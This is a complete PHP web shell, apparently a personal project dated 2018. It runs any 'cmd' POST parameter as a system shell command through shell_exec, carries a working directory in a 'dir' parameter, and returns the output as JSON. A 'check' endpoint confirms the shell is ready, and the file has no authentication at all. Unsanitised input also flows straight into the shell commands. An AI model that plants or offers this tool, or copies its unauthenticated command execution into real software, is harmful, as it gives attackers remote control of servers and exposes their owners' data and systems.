<?php
/**
* Nathan Johnson
* 11/15/18
* This is the main function.  It runs through the program in a clean, readable way.
* @param no parameters
* @return no returns
*/
function main(){
    error_reporting(E_ALL);
    Header("Content-type: text/plain");
    command_shell();
    check_connection();
}

/**
* This function takes post parameters from a front end script and processes them.
* The cmd parameter is run as a system shell command. The dir parameter is passed between front end
* and back end scripts to keep track of the working directory.
* @param cmd (passed in as POST parameter){STRING} - A command that the user would like run as
* the user hosting the php script
* @param dir (passed in as POST parameter){STRING} - The working directory.  The user doesn't
* need to active interact with it
* @return no actual returns, but the JSON object $postJSON is echo-ed, and therefore returned to
* the frontend script.  This object consists of the results of the the user supplied command, and
* the current working directory
*/
function command_shell(){
    if(isset($_POST["cmd"])){
        $command = $_POST["cmd"];
        if(isset($_POST["dir"])){
            $passed_dir = $_POST["dir"];
        } else $passed_dir = "/";
        if(substr($command, 0, 2) == "cd"){
            $dir = (shell_exec("cd " . $passed_dir . ";" . $command . ";pwd"));
        } else $dir = $passed_dir;
        $results = (shell_exec("cd " . $dir . ";" . $command));
        $postObj = new \stdClass();
        $postObj->name = $results;
        $postObj->dir = $dir;
        $postJSON = json_encode($postObj);
        Header("Content-type: application/json");
        echo $postJSON;
    }
}

/**
* This function takes in a GET parameter and responds, letting the frontend user know that the
* webshell is ready to go.  When i have more time, this will be a login, and this function will
* perform a one way hash and compare the hash to a stored hash.
* @param check {BOOL} could be any variable.
* @return no real returns, but the JSON object $myJSON is echoed, and therfore returned to the
* frontend.  This object is really just the check parameter, set as 'name' and returned back to the
* frontend
*/
function check_connection(){
    if(isset($_GET["check"])){
        $myObj = new \stdClass();
        $myObj->name = $_GET["check"];
        $myJSON = json_encode($myObj);
        echo $myJSON;
    }
}

main();
?>
